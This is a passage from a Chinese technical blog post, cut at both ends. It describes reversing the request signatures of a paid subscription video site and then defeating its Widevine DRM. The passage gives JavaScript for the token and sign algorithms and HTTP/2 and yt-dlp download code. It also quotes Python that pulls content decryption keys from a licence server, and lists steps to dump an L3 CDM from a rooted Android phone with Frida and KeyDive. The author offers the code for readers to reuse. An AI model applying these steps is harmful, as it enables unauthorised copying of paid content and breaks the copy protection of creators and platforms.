border-style: none !important; border-color: initial !important;"><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 复制代码</em><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 隐藏代码<br /></em><code style="font-family: SFMono-Regular, Consolas, ;">    <span style="color: rgb(150, 203, 254);">function</span> <span style="color: rgb(255, 255, 182);">generateBcToken</span>() {<br />        <span style="color: rgb(150, 203, 254);">if</span> (bcToken !== <span style="color: rgb(168, 255, 96);">""</span>) {<br />            <span style="color: rgb(150, 203, 254);">return</span> bcToken        }<br />        <span style="color: rgb(150, 203, 254);">const</span> <span style="color: rgb(255, 255, 182);">V</span> = () =&gt; <span style="color: rgb(255, 115, 253);">1e12</span> * <span style="color: rgb(255, 255, 182);">Math</span>.<span style="color: rgb(255, 255, 182);">random</span>()<br />        <span style="color: rgb(150, 203, 254);">const</span> <span style="color: rgb(198, 197, 254);">UA</span> = <span style="color: rgb(168, 255, 96);">'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36'</span><br />        <span style="color: rgb(150, 203, 254);">const</span> hash = sha1.<span style="color: rgb(255, 255, 182);">create</span>();<br />        <span style="color: rgb(150, 203, 254);">const</span> text = [(<span style="color: rgb(150, 203, 254);">new</span> <span style="color: rgb(255, 255, 182);">Date</span>).<span style="color: rgb(255, 255, 182);">getTime</span>(), <span style="color: rgb(255, 255, 182);">V</span>(), <span style="color: rgb(255, 255, 182);">V</span>(), <span style="color: rgb(198, 197, 254);">UA</span>].<span style="color: rgb(255, 255, 182);">map</span>(btoa).<span style="color: rgb(255, 255, 182);">join</span>(<span style="color: rgb(168, 255, 96);">"."</span>)<br />        <span style="color: rgb(198, 197, 254);">console</span>.<span style="color: rgb(255, 255, 182);">log</span>(text)<br />        hash.<span style="color: rgb(255, 255, 182);">update</span>(text);<br />        bcToken = hash.<span style="color: rgb(255, 255, 182);">hex</span>()<br />        <span style="color: rgb(150, 203, 254);">return</span> bcToken<br />    }</code></pre><p>Sign加密算法也可以解出来了</p><pre style="background-color: rgb(246, 248, 250); border-radius: 6px; padding: 4px; margin-bottom: 15px; overflow: auto; line-height: 1.45; color: rgb(68, 68, 68); font-size: 14px; letter-spacing: normal; text-align: start; border-style: none !important; border-color: initial !important;"><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 复制代码</em><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 隐藏代码<br /></em><code style="font-family: SFMono-Regular, Consolas, ;">    <span style="color: rgb(150, 203, 254);">function</span> <span style="color: rgb(255, 255, 182);">generateSha</span>({ url, auth_id }) {<br />        <span style="color: rgb(150, 203, 254);">const</span> fixPrefix = prefixToken;<br />        <span style="color: rgb(150, 203, 254);">let</span> time = +<span style="color: rgb(150, 203, 254);">new</span> <span style="color: rgb(255, 255, 182);">Date</span>();<br />        <span style="color: rgb(150, 203, 254);">const</span> toeknURL = [fixPrefix, time, url, auth_id || <span style="color: rgb(255, 115, 253);">0</span>].<span style="color: rgb(255, 255, 182);">join</span>(<span style="color: rgb(168, 255, 96);">`\n`</span>);<br />        <span style="color: rgb(150, 203, 254);">const</span> hash = sha1.<span style="color: rgb(255, 255, 182);">create</span>();<br />        hash.<span style="color: rgb(255, 255, 182);">update</span>(toeknURL);<br />        <span style="color: rgb(150, 203, 254);">return</span> {<br />            token: hash.<span style="color: rgb(255, 255, 182);">hex</span>(),            time: time        }    }<br />       <span style="color: rgb(150, 203, 254);">function</span>  <span style="color: rgb(255, 255, 182);">getSign</span>({ url, auth_id }) {<br />            <span style="color: rgb(150, 203, 254);">const</span> { time, token } = <span style="color: rgb(255, 255, 182);">generateSha</span>({ url, auth_id })<br />            <span style="color: rgb(150, 203, 254);">return</span> {<br />                sign: [signPrefix, token, <span style="color: rgb(255, 255, 182);">hashFunc</span>(token), signEnd].<span style="color: rgb(255, 255, 182);">join</span>(<span style="color: rgb(168, 255, 96);">':'</span>),                time: time            }<br />        }</code></pre><p>那基本的算法解密就搞定了，但是最近还更新了DRM<br /><img border="0" class="rich_pages wxw-img" src="https://wechat2rss.xlab.app/img-proxy/?k=74fa59bb&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZJl9l1BVE6U8uVxzjq9IQgOzVWVO4LAxQlVdQPvuT4Kf9dCwoAKLw4LYu3HSibuHHPoBfyR8Tyd2tA%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; border-width: 0px; border-color: initial; vertical-align: middle; width: auto;" width="524" /></p><p><br /><span>其中给了一个mpt和m3u8</span><br /><span>分别有不同的密钥</span><br /><span>根据测试DRM的密钥是需要写在Cookies里的</span><br /><span>但是诡异的事情来了</span><br /><span>postman可以测试成功，cmd测试失败，代码测试失败，powershell测试成功</span><br /><span>ffmpeg测试也失败</span></p><p>我的第一反应可能是TLS指纹校验了<br /><span style="font-weight: 700;">这部分事后发现1.1也可以了，只要同ip就行，我也不确定到底是我测试错误还是后期改了</span><br /><span style="font-weight: 700;">所以这部分可以直接忽略，但是因为我自己觉得补上HTTP2的代码有利于思路的连贯性分析和大家下次直接抄轮子</span><br /><span style="font-weight: 700;">思虑之后决定保留了下来</span>于是在https://github.com/nodejs/undici/issues/1983<br />抄了一段，改成OF网站的，这里就按下不表了</p><pre style="background-color: rgb(246, 248, 250); border-radius: 6px; padding: 4px; margin-bottom: 15px; overflow: auto; line-height: 1.45; color: rgb(68, 68, 68); font-size: 14px; letter-spacing: normal; text-align: start; border-style: none !important; border-color: initial !important;"><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 复制代码</em><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 隐藏代码<br /></em><code style="font-family: SFMono-Regular, Consolas, ;"><span style="color: rgb(150, 203, 254);">const</span> undici = require(<span style="color: rgb(168, 255, 96);">"undici"</span>)<br /><span style="color: rgb(150, 203, 254);">const</span> tls = require(<span style="color: rgb(168, 255, 96);">"tls"</span>)<br /><span style="color: rgb(146, 255, 184);">// From https://httptoolkit.com/blog/tls-fingerprinting-node-js/</span><br /><span style="color: rgb(150, 203, 254);">const</span> defaultCiphers = tls.DEFAULT_CIPHERS.<span style="color: rgb(255, 255, 182);">split</span>(<span style="color: rgb(168, 255, 96);">':'</span>);<br /><span style="color: rgb(150, 203, 254);">const</span> shuffledCiphers = [<br />    defaultCiphers[<span style="color: rgb(255, 115, 253);">1</span>],<br />    defaultCiphers[<span style="color: rgb(255, 115, 253);">2</span>],<br />    defaultCiphers[<span style="color: rgb(255, 115, 253);">0</span>],<br />    ...defaultCiphers.<span style="color: rgb(255, 255, 182);">slice</span>(<span style="color: rgb(255, 115, 253);">3</span>)<br />].<span style="color: rgb(255, 255, 182);">join</span>(<span style="color: rgb(168, 255, 96);">':'</span>);<br /><span style="color: rgb(150, 203, 254);">const</span> connector = undici.<span style="color: rgb(255, 255, 182);">buildConnector</span>({ ciphers: shuffledCiphers })<br /><span style="color: rgb(150, 203, 254);">const</span> client = <span style="color: rgb(150, 203, 254);">new</span> undici.<span style="color: rgb(255, 255, 182);">Client</span>(<span style="color: rgb(168, 255, 96);">"https://en.zalando.de"</span>, { connect: connector })<br />undici.<span style="color: rgb(255, 255, 182);">request</span>(<span style="color: rgb(168, 255, 96);">"https://en.zalando.de/api/navigation"</span>, {    dispatcher: client,    headers: {<br />        <span style="color: rgb(168, 255, 96);">"User-Agent"</span>: <span style="color: rgb(168, 255, 96);">"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"</span>    }<br />}).<span style="color: rgb(255, 255, 182);">then</span>(<span style="color: rgb(150, 203, 254);">async</span> (res) =&gt; {<br />    <span style="color: rgb(150, 203, 254);">const</span> body = <span style="color: rgb(150, 203, 254);">await</span> res.body.<span style="color: rgb(255, 255, 182);">json</span>()<br />    <span style="color: rgb(198, 197, 254);">console</span>.<span style="color: rgb(255, 255, 182);">log</span>(body)})<br /></code></pre><p>依然没有成功，这个时候还跟无头苍蝇一样打转，我认为可能是TLS因为Node修改的不彻底导致的，决定切换Go技术栈试试于是找到了https://juejin.cn/post/7073264626506399751#heading-4测试惊觉发现竟然是HTTTP2于是返回抓包看了一眼发现确实都是HTTP2！<br /><img border="0" class="rich_pages wxw-img" src="https://wechat2rss.xlab.app/img-proxy/?k=9bb8db22&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZJl9l1BVE6U8uVxzjq9IQgOYgaCl0xTfYtPPm9Ly8WGV74YKukwiabRarVotib7MHFqTuWjeBe6L4xw%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; border-width: 0px; border-color: initial; vertical-align: middle; width: auto;" width="414" /></p><p><br /><span>那果断切一下HTTP2的通信协议试一下</span></p><pre style="background-color: rgb(246, 248, 250); border-radius: 6px; padding: 4px; margin-bottom: 15px; overflow: auto; line-height: 1.45; color: rgb(68, 68, 68); font-size: 14px; letter-spacing: normal; text-align: start; border-style: none !important; border-color: initial !important;"><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 复制代码</em><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 隐藏代码<br /></em><code style="font-family: SFMono-Regular, Consolas, ;">js<br /><span style="color: rgb(150, 203, 254);">const</span> http2 = require(<span style="color: rgb(168, 255, 96);">"http2"</span>);<br /><span style="color: rgb(150, 203, 254);">const</span> client = http2.<span style="color: rgb(255, 255, 182);">connect</span>(<span style="color: rgb(168, 255, 96);">"https://cdn3.OF网站.com"</span>);<br /><span style="color: rgb(150, 203, 254);">const</span> req = client.<span style="color: rgb(255, 255, 182);">request</span>({<br />  <span style="color: rgb(168, 255, 96);">":method"</span>: <span style="color: rgb(168, 255, 96);">"GET"</span>,<br />  <span style="color: rgb(168, 255, 96);">":path"</span>: <span style="color: rgb(168, 255, 96);">"/dash/files/3/3f/XXX/XXX.mpd"</span>,<br />  <span style="color: rgb(168, 255, 96);">"accept"</span>: <span style="color: rgb(168, 255, 96);">"*/*"</span>,<br />  <span style="color: rgb(168, 255, 96);">"accept-language"</span>: <span style="color: rgb(168, 255, 96);">"zh-CN,zh;q=0.9"</span>,<br />  <span style="color: rgb(168, 255, 96);">"cache-control"</span>: <span style="color: rgb(168, 255, 96);">"no-cache"</span>,<br />  <span style="color: rgb(168, 255, 96);">"pragma"</span>: <span style="color: rgb(168, 255, 96);">"no-cache"</span>,<br />  <span style="color: rgb(168, 255, 96);">"priority"</span>: <span style="color: rgb(168, 255, 96);">"u=1, i"</span>,<br />  <span style="color: rgb(168, 255, 96);">"sec-ch-ua"</span>: <span style="color: rgb(168, 255, 96);">"\"Not/A)Brand\";v=\"8\", \"Chromium\";v=\"126\", \"Google Chrome\";v=\"126\""</span>,<br />  <span style="color: rgb(168, 255, 96);">"sec-ch-ua-mobile"</span>: <span style="color: rgb(168, 255, 96);">"?0"</span>,<br />  <span style="color: rgb(168, 255, 96);">"sec-ch-ua-platform"</span>: <span style="color: rgb(168, 255, 96);">"\"Windows\""</span>,<br />  <span style="color: rgb(168, 255, 96);">"sec-fetch-dest"</span>: <span style="color: rgb(168, 255, 96);">"empty"</span>,<br />  <span style="color: rgb(168, 255, 96);">"sec-fetch-mode"</span>: <span style="color: rgb(168, 255, 96);">"cors"</span>,<br />  <span style="color: rgb(168, 255, 96);">"sec-fetch-site"</span>: <span style="color: rgb(168, 255, 96);">"same-site"</span>,<br />  <span style="color: rgb(168, 255, 96);">"cookie"</span>: <span style="color: rgb(168, 255, 96);">"保护隐私"</span>,<br />  <span style="color: rgb(168, 255, 96);">"Referer"</span>: <span style="color: rgb(168, 255, 96);">"https://OF网站.com/"</span>,<br />  <span style="color: rgb(168, 255, 96);">"Referrer-Policy"</span>: <span style="color: rgb(168, 255, 96);">"strict-origin-when-cross-origin"</span>});<br /><span style="color: rgb(150, 203, 254);">let</span> data = <span style="color: rgb(168, 255, 96);">""</span>;<br />req.<span style="color: rgb(255, 255, 182);">on</span>(<span style="color: rgb(168, 255, 96);">"response"</span>, (headers, flags) =&gt; {<br />  <span style="color: rgb(150, 203, 254);">for</span> (<span style="color: rgb(150, 203, 254);">const</span> name <span style="color: rgb(150, 203, 254);">in</span> headers) {<br />    <span style="color: rgb(198, 197, 254);">console</span>.<span style="color: rgb(255, 255, 182);">log</span>(<span style="color: rgb(168, 255, 96);">`<span style="color: rgb(218, 239, 163);">${name}</span>: <span style="color: rgb(218, 239, 163);">${headers[name]}</span>`</span>);  }});<br />req.<span style="color: rgb(255, 255, 182);">on</span>(<span style="color: rgb(168, 255, 96);">"data"</span>, chunk =&gt; {  data += chunk;});<br />req.<span style="color: rgb(255, 255, 182);">on</span>(<span style="color: rgb(168, 255, 96);">"end"</span>, () =&gt; {<br />  <span style="color: rgb(198, 197, 254);">console</span>.<span style="color: rgb(255, 255, 182);">log</span>(data);<br />  client.<span style="color: rgb(255, 255, 182);">close</span>();});<br />req.<span style="color: rgb(255, 255, 182);">end</span>();</code></pre><p>果然成功读取到数据！<br /><img border="0" class="rich_pages wxw-img" src="https://wechat2rss.xlab.app/img-proxy/?k=19300fdc&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZJl9l1BVE6U8uVxzjq9IQgOMa9LQUq4ysSPICnRic5tibrlKwkydCJAVicXQNEEoD9IeiagRJhKiao1DgA%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; border-width: 0px; border-color: initial; vertical-align: middle; width: auto;" width="481" /></p><p><br /><span>根据查看同类库OF-DRM (这个库真的帮助了我很多思路)</span><br /><span>可以发现使用了一个yt-dlp</span><br /><span>我们可以找一个nodejs版本的</span><br /><span>测试代码如下</span></p><pre style="background-color: rgb(246, 248, 250); border-radius: 6px; padding: 4px; margin-bottom: 15px; overflow: auto; line-height: 1.45; color: rgb(68, 68, 68); font-size: 14px; letter-spacing: normal; text-align: start; border-style: none !important; border-color: initial !important;"><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 复制代码</em><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 隐藏代码<br /></em><code style="font-family: SFMono-Regular, Consolas, ;"><span style="color: rgb(150, 203, 254);">const</span> path = require(<span style="color: rgb(168, 255, 96);">'path'</span>);<br /><span style="color: rgb(150, 203, 254);">const</span> <span style="color: rgb(255, 255, 182);">YTDlpWrap</span> = require(<span style="color: rgb(168, 255, 96);">'yt-dlp-wrap'</span>).default;<br /><span style="color: rgb(150, 203, 254);">const</span> ytDlpWrap = <span style="color: rgb(150, 203, 254);">new</span> <span style="color: rgb(255, 255, 182);">YTDlpWrap</span>(path.<span style="color: rgb(255, 255, 182);">join</span>(<span style="color: rgb(168, 255, 96);">'./yt-dlp_x86.exe'</span>));<br /><span style="color: rgb(150, 203, 254);">let</span> ytDlpEventEmitter = ytDlpWrap<br />    .<span style="color: rgb(255, 255, 182);">exec</span>([<br />        <span style="color: rgb(168, 255, 96);">'https://cdn3.OF网站.com/hls/files/a/a2/xxx/xxx.m3u8'</span>,<br />        <span style="color: rgb(168, 255, 96);">"-f"</span>,<br />        <span style="color: rgb(168, 255, 96);">"bestvideo[ext=mp4]+bestaudio[ext=m4a]/best[ext=mp4]/best[ext=m4a]"</span>,<br />        <span style="color: rgb(168, 255, 96);">"--allow-u"</span>,<br />        <span style="color: rgb(168, 255, 96);">"--no-part"</span>,<br />        <span style="color: rgb(168, 255, 96);">"--restrict-filenames"</span>,<br />        <span style="color: rgb(168, 255, 96);">"-N 4"</span>,<br />        <span style="color: rgb(168, 255, 96);">'--add-headers'</span>,<br />        <span style="color: rgb(168, 255, 96);">`Cookie:"个人隐私"`</span>,<br />        <span style="color: rgb(168, 255, 96);">'-o'</span>,<br />        <span style="color: rgb(168, 255, 96);">'F:/vmware/output2.mp4'</span>,    ])<br />    .<span style="color: rgb(255, 255, 182);">on</span>(<span style="color: rgb(168, 255, 96);">'progress'</span>, (progress) =&gt;<br />        <span style="color: rgb(198, 197, 254);">console</span>.<span style="color: rgb(255, 255, 182);">log</span>(            progress.percent,            progress.totalSize,            progress.currentSpeed,            progress.eta        )    )<br />    .<span style="color: rgb(255, 255, 182);">on</span>(<span style="color: rgb(168, 255, 96);">'ytDlpEvent'</span>, (eventType, eventData) =&gt;<br />        <span style="color: rgb(198, 197, 254);">console</span>.<span style="color: rgb(255, 255, 182);">log</span>(eventType, eventData)    )<br />    .<span style="color: rgb(255, 255, 182);">on</span>(<span style="color: rgb(168, 255, 96);">'error'</span>, (error) =&gt; <span style="color: rgb(198, 197, 254);">console</span>.<span style="color: rgb(255, 255, 182);">error</span>(error))<br />    .<span style="color: rgb(255, 255, 182);">on</span>(<span style="color: rgb(168, 255, 96);">'close'</span>, () =&gt; <span style="color: rgb(198, 197, 254);">console</span>.<span style="color: rgb(255, 255, 182);">log</span>(<span style="color: rgb(168, 255, 96);">'all done'</span>));<br /><span style="color: rgb(198, 197, 254);">console</span>.<span style="color: rgb(255, 255, 182);">log</span>(ytDlpEventEmitter.ytDlpProcess.pid);</code></pre><p>我也是刚接触，不一定参数描述的正确，-f表示格式，allow-u表示允许无法格式化的视频下载，no-part不要使用分割部分文件，restrict-filenames貌似是控制短标题和特殊字符的，-N应该是多线程<br />只有使用这套能绕过DRM的版权下载问题</p><p>下载完成后发现依然没法播放根据研究是视频使用了加密这个时候可以根据技术栈下手<br />根据搜索drm找到了<code style="font-family: SFMono-Regular, Consolas, ;">"DRM encrypted source cannot be decrypted without a DRM plugin</code>根据上下文找到videojs字样<br /><img border="0" class="rich_pages wxw-img" src="https://wechat2rss.xlab.app/img-proxy/?k=0c785cff&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZJl9l1BVE6U8uVxzjq9IQgOibaFapz6ecicGyqOWdEfy0BLGdROOjAIuIXSF4nbvCmIMqMtYZ68P6uw%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; border-width: 0px; border-color: initial; vertical-align: middle; width: auto;" width="274" /></p><p><br /><span>所以怀疑是videojs</span><br /><span>于是找videojs的DRM库，找到了</span>https://github.com/videojs/videojs-contrib-eme?tab=readme-ov-file#using<br /><span>使用例子是</span></p><pre style="background-color: rgb(246, 248, 250); border-radius: 6px; padding: 4px; margin-bottom: 15px; overflow: auto; line-height: 1.45; color: rgb(68, 68, 68); font-size: 14px; letter-spacing: normal; text-align: start; border-style: none !important; border-color: initial !important;"><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 复制代码</em><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 隐藏代码<br /></em><code style="font-family: SFMono-Regular, Consolas, ;">player.<span style="color: rgb(255, 255, 182);">eme</span>();<br />player.<span style="color: rgb(255, 255, 182);">src</span>({<br />  src: <span style="color: rgb(168, 255, 96);">'&lt;your url here&gt;'</span>,<br />  type: <span style="color: rgb(168, 255, 96);">'application/dash+xml'</span>,  keySystems: {<br />    <span style="color: rgb(168, 255, 96);">'com.widevine.alpha'</span>: <span style="color: rgb(168, 255, 96);">'&lt;YOUR URL HERE&gt;'</span>  }<br />});</code></pre><p>在网页中搜索eme，发现也能找到，下一个断点之后调试打印src的o内容<br /><img border="0" class="rich_pages wxw-img" src="https://wechat2rss.xlab.app/img-proxy/?k=d3664798&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZJl9l1BVE6U8uVxzjq9IQgO6eTicKDXzTOXY38VfOsFPIDtT0sCVN4nUvVcwkayqViaMlwyrjJWjIgA%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; border-width: 0px; border-color: initial; vertical-align: middle; width: auto;" width="691" /></p><p><br /><span>根据文档getLicense()- 允许异步检索许可证。</span><br /><span>所以我们目前应该主攻getLicense(）函数了</span><br /><span>其中代码为</span></p><pre style="background-color: rgb(246, 248, 250); border-radius: 6px; padding: 4px; margin-bottom: 15px; overflow: auto; line-height: 1.45; color: rgb(68, 68, 68); font-size: 14px; letter-spacing: normal; text-align: start; border-style: none !important; border-color: initial !important;"><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 复制代码</em><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 隐藏代码<br /></em><code style="font-family: SFMono-Regular, Consolas, ;">                    getLicense: (e,s,o)=&gt;{<br />                        j.vM.<span style="color: rgb(255, 255, 182);">xhr</span>({                            url: i,<br />                            method: <span style="color: rgb(168, 255, 96);">"POST"</span>,<br />                            responseType: <span style="color: rgb(168, 255, 96);">"arraybuffer"</span>,<br />                            body: <span style="color: rgb(150, 203, 254);">new</span> <span style="color: rgb(255, 255, 182);">Uint8Array</span>(s),                            headers: {<br />                                <span style="color: rgb(168, 255, 96);">"Content-type"</span>: <span style="color: rgb(168, 255, 96);">"application/octet-stream"</span>,                                ...t                            },<br />                            withCredentials: !<span style="color: rgb(255, 115, 253);">0</span>                        }, ((e,i,t)=&gt;{<br />                            e ? <span style="color: rgb(255, 255, 182);">o</span>(e) : <span style="color: rgb(255, 255, 182);">o</span>(<span style="color: rgb(198, 197, 254);">null</span>, t)                        }                        ))<br />                    }</code></pre><p>往上一层看这里可以看到创建了一个promise，当调用获取许可时会回调y，而y会把数据触发调用promise的Resolve出去，导致普通人很容易跟丢<br /><img border="0" class="rich_pages wxw-img" src="https://wechat2rss.xlab.app/img-proxy/?k=0fd61c12&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZJl9l1BVE6U8uVxzjq9IQgOibgF2AiaTzae4icnsLgfXqox6xvKohC3M3pwJFhtAwkBxr6b2DW4JWfpA%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; border-width: 0px; border-color: initial; vertical-align: middle; width: auto;" width="574" /></p><p style="line-height: normal; margin-bottom: 0px;"><br /><span>实际上接下来的流程处理在</span><br /><img border="0" class="rich_pages wxw-img" src="https://wechat2rss.xlab.app/img-proxy/?k=9f9402a8&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZJl9l1BVE6U8uVxzjq9IQgOWldrQz619xwEicRvdBprlZ2JpSESAZQShjicnibyKRu2eGx5UKFGQJtdA%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; border-width: 0px; border-color: initial; vertical-align: middle; width: auto;" width="1080" /><span></span><br /><span>其中u是MediaKeySession，读取了我们的密钥，而MediaKeySession的接口代表与内容解密模块 (CDM) 进行消息交换的上下文。</span></p><p><br /></p><p>以CDM为关键词，可以搜到https://www.freebuf.com/articles/database/375523.html</p><pre style="background-color: rgb(246, 248, 250); border-radius: 6px; padding: 4px; margin-bottom: 15px; overflow: auto; line-height: 1.45; color: rgb(68, 68, 68); font-size: 14px; letter-spacing: normal; text-align: start; border-style: none !important; border-color: initial !important;"><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 复制代码</em><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 隐藏代码<br /></em><code style="font-family: SFMono-Regular, Consolas, ;">全球现有三大实现方案，分别为谷歌的Widevine、苹果的FairPlay和微软的PlayReady。其中Widevine实现简单，免费，市场占有率最高，应用最广泛。Widevine客户端主要内置于手机、电视、各大浏览器、播放器等，用于解密被保护的视频。<br />Widevine拥有三个安全级别——L1、L2和L3。L1是最高的安全级别，解密全过程在硬件中完成，需要设备支持。L3的安全级别最低，解密全程在CDM（<span style="color: rgb(255, 255, 182);">Content</span> Decryption Module ）软件中完成。L2介于两者之间， 核心解密过程在硬件完成，视频处理阶段在软件中完成。本文只讨论L3级视频的解密方式。</code></pre><p>既然我们是谷歌浏览器，那我们大概率是Widevine的DRM保护了那接下来的目标就是如何解密CDM既然已经确定了是wvd l3我们需要获取解密mp4的密钥需要ppsh和License URL找到的wvd代码来自https://forum.videohelp.com/threads/414040-Need-some-help-to-download-drm-protected-video-from-this-free-service<br />这里我截取片段</p><pre style="background-color: rgb(246, 248, 250); border-radius: 6px; padding: 4px; margin-bottom: 15px; overflow: auto; line-height: 1.45; color: rgb(68, 68, 68); font-size: 14px; letter-spacing: normal; text-align: start; border-style: none !important; border-color: initial !important;"><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 复制代码</em><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 隐藏代码<br /></em><code style="font-family: SFMono-Regular, Consolas, ;">WVD_FILE = <span style="color: rgb(168, 255, 96);">"device_wvd_file.wvd"</span><br />PLAYER_URL = <span style="color: rgb(168, 255, 96);">'https://aloula.faulio.com/api/v1/video/{video_id}/player'</span><br />ORIGIN = <span style="color: rgb(168, 255, 96);">"https://www.aloula.sa"</span>def get_keys(pssh_value, license_url):<br />    <span style="color: rgb(150, 203, 254);">if</span> pssh_value is None:<br />        <span style="color: rgb(150, 203, 254);">return</span> []    try:        device = Device.load(WVD_FILE)    except:<br />        <span style="color: rgb(150, 203, 254);">return</span> []    pssh_value = PSSH(pssh_value)    cdm = Cdm.from_device(device)    cdm_session_id = cdm.open()    challenge = cdm.get_license_challenge(cdm_session_id, pssh_value)    licence = requests.post(        license_url, data=challenge,<br />        headers={<span style="color: rgb(168, 255, 96);">"Origin"</span>: ORIGIN}    )    licence.raise_for_status()    cdm.parse_license(cdm_session_id, licence.content)    keys = []<br />    <span style="color: rgb(150, 203, 254);">for</span> key in cdm.get_keys(cdm_session_id):<br />        <span style="color: rgb(150, 203, 254);">if</span> <span style="color: rgb(168, 255, 96);">"CONTENT"</span> in key.<span style="color: rgb(150, 203, 254);">type</span>:<br />            keys += [f<span style="color: rgb(168, 255, 96);">"{key.kid.hex}:{key.key.hex()}"</span>]    cdm.close(cdm_session_id)<br />    <span style="color: rgb(150, 203, 254);">return</span> keys</code></pre><p>ppsh和licence属于网站提取的内容，那wvd是什么？Create a Widevine Device (.wvd) file from an RSA Private Key (PEM or DER) and Client ID Blob.wvd是Widevine Device ，是根据一个RSA私钥和Client IDBlob生成的其提取的方法我在https://forum.videohelp.com/threads/404994-Decryption-and-the-Temple-of-Doom找到了，当然也可以使用现有的，但是本着苏格拉底式学习的思想，决定尝试手动提取WVD另外也找到了一个疑似可以在线处理的网站https://cdrm-project.com/同时这个网站也提供了大量的WVD DRM分析的文章和工具<br />https://cdm-project.com/</p><p>注意！！！根据测试模拟器没有WVD，不要尝试在模拟器搞首先需要root和安装magisk然后在magisk的设置的超级用户访问选择用户和ADB，重启<br /><img border="0" class="rich_pages wxw-img" src="https://wechat2rss.xlab.app/img-proxy/?k=1c93f222&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZJl9l1BVE6U8uVxzjq9IQgOydxz1Kb6PYCgJwaWs01duzdOXU33BcicdsKxLn76hb44T9FbxwcQ0Xg%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; border-width: 0px; border-color: initial; vertical-align: middle; width: auto;" width="1080" /></p><p><br /><img border="0" class="rich_pages wxw-img" src="https://wechat2rss.xlab.app/img-proxy/?k=9a070c2f&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZJl9l1BVE6U8uVxzjq9IQgO2Q3Ud4lKBJpWJgib8h24ibdx38ibGkmU6icTHD0cqVxHpcdMAsRrIYy3Eg%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; border-width: 0px; border-color: initial; vertical-align: middle; width: auto;" width="1080" /><span></span><br /><span>然后安装MagiskFrida</span>https://github.com/ViRb3/magisk-frida/releases<br /><span>下载出来在magisk导入模块</span><br /><span>最好也装上L1回退模块</span>https://github.com/hzy132/liboemcryptodisabler/releases/tag/v1.5.1<br /><span>全部搞定之后安装adb，为了图方便可以直接把adb的目录塞到path里</span><br /><span>这样就有adb命令了</span><br /><span>输入adb查看有没有手机</span><br /><span>确定有之后拉取https://github.com/hyugogirubato/KeyDive的代码</span><br /><span>输入</span><code style="font-family: Consolas, Monaco, ;">pip install -r requirements.txt</code><span>安装依赖</span><br /><span>因为adb devices找到了</span></p><p><br /></p><pre style="background-color: rgb(246, 248, 250); border-radius: 6px; padding: 4px; margin-bottom: 15px; overflow: auto; line-height: 1.45; color: rgb(68, 68, 68); font-size: 14px; letter-spacing: normal; text-align: start; border-style: none !important; border-color: initial !important;"><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 复制代码</em><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 隐藏代码<br /></em><code style="font-family: SFMono-Regular, Consolas, ;">List of devices attached<br />emulator-5554   device</code></pre><p>输入<code style="font-family: SFMono-Regular, Consolas, ;">python keydive.py -a -d ‘emulator-5554’ -w</code>即可导出</p><p>就是这样，你现在应该有一个以 ClientId 和 Private_key.pem 形式存在的 CDM，它们藏在 Keydive 文件夹根目录中的设备中（因为我本机没root，模拟器又复现失败了...所以这步要靠自己了，不过应该大差不差，因为我AVD提取成功了~）</p><p>因为模拟器不支持wvd DRM所以根据https://forum.videohelp.com/threads/408031-Dumping-Your-own-L3-CDM-with-Android-Studio尝试andirod Studio获取DRM<br /><img border="0" class="rich_pages wxw-img" 